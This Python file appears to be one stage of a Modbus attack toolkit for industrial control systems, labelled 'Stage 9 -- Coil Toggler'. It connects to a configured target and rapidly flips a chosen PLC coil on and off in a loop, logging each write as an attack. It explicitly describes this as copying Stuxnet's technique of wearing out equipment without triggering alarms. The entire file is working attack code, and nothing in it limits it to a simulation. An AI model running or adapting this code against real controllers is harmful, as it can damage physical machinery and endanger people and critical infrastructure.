import time
import threading
from pymodbus.client import ModbusTcpClient
from scripts.config import get
from utils.colors import ok, err, info, warn, red, green, yellow, cyan, white
from utils import logger

STAGE = {
    'name': 'Coil Toggler',
    'key':  '9',
    'desc': 'rapidly toggle coils to simulate mechanical wear',
}

BANNER = f"""
{red("  ╔══════════════════════════════════════╗")}
{red("  ║")} {white("STAGE 9 -- COIL TOGGLER                ")}{red("║")}
{red("  ╚══════════════════════════════════════╝")}
"""

_stop = threading.Event()


def _loop(ip, port, coil, interval):
    client = ModbusTcpClient(ip, port=port)
    client.connect()
    state = True
    count = 0

    while not _stop.is_set():
        try:
            client.write_coil(address=coil, value=state)
            count += 1
            color = green('ON ') if state else red('OFF')
            print(
                f"\r  {red('[TOGGLE]')} coil {yellow(str(coil))}  "
                f"state={color}  count={yellow(str(count))}  ",
                end='', flush=True
            )
            logger.attack(f"Coil {coil} toggled {'ON' if state else 'OFF'} (count={count})")
            state = not state
        except Exception as e:
            print()
            print(warn(f"Error: {e}. Reconnecting..."))
            client.close()
            client = ModbusTcpClient(ip, port=port)
            client.connect()
        time.sleep(interval)

    client.close()
    print()
    print(ok(f"Toggler stopped after {count} toggles."))
    logger.info(f"Toggler stopped -- {count} toggles on coil {coil}")


def run(cfg=None):
    if cfg is None:
        cfg = get()
    ip   = cfg['target_ip']
    port = cfg['target_port']

    print(BANNER)
    print(info("Rapid coil toggling simulates Stuxnet's mechanical wear technique."))
    print(info("Stuxnet toggled centrifuge frequencies rapidly to stress rotors"))
    print(info("without triggering immediate alarms."))
    print()

    try:
        coil_input = input(cyan("  Coil address to toggle [0]: ")).strip()
        coil = int(coil_input) if coil_input else 0

        interval_input = input(cyan("  Toggle interval in seconds [0.5]: ")).strip()
        interval = float(interval_input) if interval_input else 0.5
    except ValueError:
        print(err("Invalid input. Using defaults."))
        coil, interval = 0, 0.5

    print()
    print(info(f"Toggling coil {coil} every {interval}s on {ip}:{port}"))
    print(warn("Press Ctrl+C to stop."))
    print()

    _stop.clear()
    t = threading.Thread(target=_loop, args=(ip, port, coil, interval), daemon=True)
    t.start()
    logger.attack(f"Toggler started -- coil={coil}, interval={interval}s on {ip}:{port}")

    try:
        while t.is_alive():
            time.sleep(0.2)
    except KeyboardInterrupt:
        print()
        print(info("Stopping toggler..."))
        _stop.set()
        t.join()
